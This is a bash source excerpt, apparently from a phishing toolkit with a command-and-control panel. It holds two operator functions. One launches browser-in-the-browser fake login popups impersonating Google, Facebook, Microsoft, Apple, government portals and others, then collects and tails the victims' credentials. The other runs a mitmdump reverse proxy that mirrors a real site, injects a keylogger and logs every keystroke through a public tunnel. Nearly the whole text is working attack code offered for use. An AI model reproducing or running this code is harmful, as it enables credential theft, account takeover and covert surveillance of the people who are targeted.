remote_bitb() {
    ensure_c2
    banner
    step 4 "LAUNCH — Browser-in-the-Browser"
    echo ""
    info "This creates a fake login popup that looks like the real site"
    info "Victim clicks a link → sees a convincing popup → enters credentials"
    echo ""

    # Auto-select BitB theme based on target domain
    local _theme="blank"
    case "${TARGET_DOMAIN,,}" in
        *facebook*)                         _theme="facebook" ;;
        *google*|*gmail*|*youtube*)         _theme="google" ;;
        *outlook*|*microsoft*|*live*|*hotmail*) _theme="outlook" ;;
        *instagram*)                        _theme="instagram" ;;
        *twitter*|*x.com*)                  _theme="twitter" ;;
        *linkedin*)                         _theme="linkedin" ;;
        *tiktok*)                           _theme="tiktok" ;;
        *apple*|*icloud*|*appleid*)         _theme="apple" ;;
        *discord*)                          _theme="discord" ;;
        *snapchat*)                         _theme="snapchat" ;;
        *reddit*)                           _theme="reddit" ;;
        *steam*|*steamcommunity*)           _theme="steam" ;;
        *amazon*)                           _theme="amazon" ;;
        *julazone*)                         _theme="julazone" ;;
        *gov*|*government*|*portal*)        _theme="gov-portal" ;;
    esac
    # Show auto-detected theme and let operator confirm or override
    echo ""
    info "Auto-detected theme: ${W}$_theme${N}  (from: $TARGET_DOMAIN)"
    echo ""
    echo -e "  Available themes:"
    local _i=1 _themes_list=()
    for _d in "$BITB_DIR/themes"/*/; do
        _tname=$(basename "$_d")
        [ "$_tname" = "https" ] && continue   # skip non-theme dirs
        _themes_list+=("$_tname")
        if [ "$_tname" = "$_theme" ]; then
            echo -e "  ${G}[$_i] $_tname  ← auto-selected${N}"
        else
            echo -e "  ${C}[$_i] $_tname${N}"
        fi
        (( _i++ ))
    done
    echo -e "  ${C}[d] dynamic${N}  — generate for '$TARGET_DOMAIN' (any unlisted site)"
    echo ""
    ask "Pick theme number, 'd' for dynamic, or Enter to use '$_theme'"
    if [ -n "$REPLY" ]; then
        if [ "$REPLY" = "d" ] || [ "$REPLY" = "D" ]; then
            _theme="__dynamic__"
        elif [[ "$REPLY" =~ ^[0-9]+$ ]]; then
            local _pick=$(( REPLY - 1 ))
            if [ "$_pick" -ge 0 ] && [ "$_pick" -lt "${#_themes_list[@]}" ]; then
                _theme="${_themes_list[$_pick]}"
                ok "Theme set to: $_theme"
            else
                warn "Invalid number — keeping '$_theme'"
            fi
        else
            # Typed a name directly
            if [ -d "$BITB_DIR/themes/$REPLY" ]; then
                _theme="$REPLY"
                ok "Theme set to: $_theme"
            else
                warn "Theme '$REPLY' not found — keeping '$_theme'"
            fi
        fi
    fi

    if [ "$_theme" = "__dynamic__" ]; then
        _generate_bitb_page "$TARGET_DOMAIN" > "$BITB_DIR/index.html"
        ok "BitB theme: dynamic (generated for $TARGET_DOMAIN)"
    elif [ -f "$BITB_DIR/themes/$_theme/index.html" ]; then
        cp "$BITB_DIR/themes/$_theme/index.html" "$BITB_DIR/index.html"
        ok "BitB theme: $_theme"
    elif [ -n "$TARGET_DOMAIN" ]; then
        _generate_bitb_page "$TARGET_DOMAIN" > "$BITB_DIR/index.html"
        ok "BitB theme: dynamic (generated for $TARGET_DOMAIN)"
    else
        cp "$BITB_DIR/themes/blank/index.html" "$BITB_DIR/index.html"
        ok "BitB theme: blank"
    fi

    step "4a" "Starting BitB catcher server..."
    pkill -f "catcher.py" 2>/dev/null; sleep 1
    local _abs_op _abs_bitb _clog
    _abs_op="$(cd "$OP" && pwd)"
    _abs_bitb="$(cd "$BITB_DIR" && pwd)"
    _clog="/tmp/bitb_server_${UID}.log"
    rm -f "$_clog"
    LOG_DIR="$_abs_op/logs" nohup python3 "$_abs_bitb/catcher.py" > "$_clog" 2>&1 &
    sleep 2
    if ss -tlnp 2>/dev/null | grep -q ":8082 "; then
        ok "Catcher running on :8082"
        ok "Credentials → $_abs_op/logs/credentials.txt  (same as C2 panel)"
    else
        err "Catcher failed to auto-start — run this in a new terminal to fix it:"
        echo ""
        echo -e "  ${W}cd $_abs_bitb && LOG_DIR=\"$_abs_op/logs\" python3 catcher.py${N}"
        echo ""
        tail -5 "$_clog" 2>/dev/null
        ask "Press Enter once you've started the catcher manually, or Ctrl+C to abort"
    fi
    CATCHER_PORT=8082

    open_tunnel 8082

    step "4c" "Waiting for credentials..."
    echo ""
    info "When victim opens the link and submits, credentials appear below:"
    info "Also visible in C2 panel → Credentials tab"
    echo ""

    step 5 "MONITOR — watching $OP/logs/credentials.txt"
    echo -e "  ${Y}Ctrl+C to stop${N}\n"
    log "BitB running — tunnel: $TUNNEL_URL"
    tail -f "$OP/logs/credentials.txt" 2>/dev/null
}

remote_mitm_keylogger() {
    ensure_c2
    banner
    step 4 "LAUNCH — MitM + Keylogger"
    echo ""
    info "Victim visits your link → sees real $TARGET_DOMAIN → keylogger captures every keystroke"
    echo ""

    PROXY_PORT=8083
    CATCHER_PORT=9999
    KL_DIR="/tmp/kl_run"
    mkdir -p "$KL_DIR/logs"

    # ── Copy intercept + catcher from embedded files ─────────────
    step "4a" "Preparing keylogger files..."
    cp "$MITM_DIR/intercept.py" "$KL_DIR/inject.py"
    cp "$MITM_DIR/catcher.py"   "$KL_DIR/catcher.py"
    ok "inject.py ready"
    ok "catcher.py ready"

    # ── Start catcher ─────────────────────────────────────────────
    step "4b" "Starting keystroke catcher on :$CATCHER_PORT..."
    pkill -f "catcher.py" 2>/dev/null; sleep 1
    CATCHER_PORT=$CATCHER_PORT LOG_DIR="$KL_DIR/logs" \
        nohup python3 "$KL_DIR/catcher.py" > "$KL_DIR/catcher.log" 2>&1 &
    sleep 2
    if ss -tlnp 2>/dev/null | grep -q ":$CATCHER_PORT "; then
        ok "Catcher listening on :$CATCHER_PORT"
    else
        err "Catcher failed to start — check $KL_DIR/catcher.log"
        wait_key; return
    fi

    # ── Start mitmdump ────────────────────────────────────────────
    step "4c" "Starting reverse proxy on :$PROXY_PORT..."
    pkill -f mitmdump 2>/dev/null; sleep 1
    # Strip any protocol prefix so we don't get reverse:https://https://...
    local _proxy_target
    _proxy_target="${TARGET_DOMAIN#http://}"
    _proxy_target="${_proxy_target#https://}"
    _proxy_target="${_proxy_target%%/*}"   # strip path — mitmdump needs just host
    TARGET_DOMAIN=$TARGET_DOMAIN MY_IP=$MY_IP CATCHER_PORT=$CATCHER_PORT \
    LOG_DIR=$KL_DIR/logs \
    nohup mitmdump \
        -s "$KL_DIR/inject.py" \
        --mode "reverse:https://$_proxy_target" \
        --ssl-insecure \
        -p $PROXY_PORT \
        --quiet > "$KL_DIR/proxy.log" 2>&1 &
    sleep 3
    if ss -tlnp 2>/dev/null | grep -q ":$PROXY_PORT "; then
        ok "Proxy mirroring $TARGET_DOMAIN on :$PROXY_PORT"
    else
        err "Proxy failed — check $KL_DIR/proxy.log"
        tail -5 "$KL_DIR/proxy.log"
        wait_key; return
    fi

    # ── Open tunnel ───────────────────────────────────────────────
    open_tunnel $PROXY_PORT

    step 5 "MONITOR — live keystrokes"
    echo -e "  ${Y}Ctrl+C to stop${N}\n"
    log "Keylogger running — tunnel: $TUNNEL_URL"
    # Pre-create log files so tail -f doesn't exit
    mkdir -p "$KL_DIR/logs"
    touch "$KL_DIR/logs/keystrokes.txt" "$KL_DIR/logs/credentials.txt"
    tail -f "$KL_DIR/logs/keystrokes.txt" "$KL_DIR/logs/credentials.txt" 2>/dev/null
}

